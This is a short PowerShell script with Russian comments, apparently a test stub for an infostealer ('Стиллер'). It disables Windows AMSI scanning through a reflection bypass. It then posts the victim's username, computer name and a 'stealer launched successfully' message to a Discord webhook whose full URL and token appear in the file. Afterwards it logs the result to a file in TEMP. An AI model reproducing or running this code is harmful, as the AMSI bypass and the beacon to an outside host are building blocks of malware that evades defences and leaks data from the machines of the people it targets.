# Минимальный тест — ничего не крадёт, просто отправляет сообщение
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$webhook = "https://discord.com/api/webhooks/1464644525132742688/Nklo9KcxdCsJF4wn7QX7JkqT5w4diK_iax_V1m_zoFJtStdrYBF6-FYsjSakPULKJW0T"   # ← вставь свой webhook

$payload = @{
content = "✅ Стиллер запустился успешно!`nПользователь: $($env:USERNAME)`nПК: $($env:COMPUTERNAME)`nВремя: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
username = "Stealer Test"
} | ConvertTo-Json

try {
Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 15
"Тест отправлен успешно" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8
} catch {
"Ошибка: $($_.Exception.Message)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8
}

Start-Sleep -Seconds 30
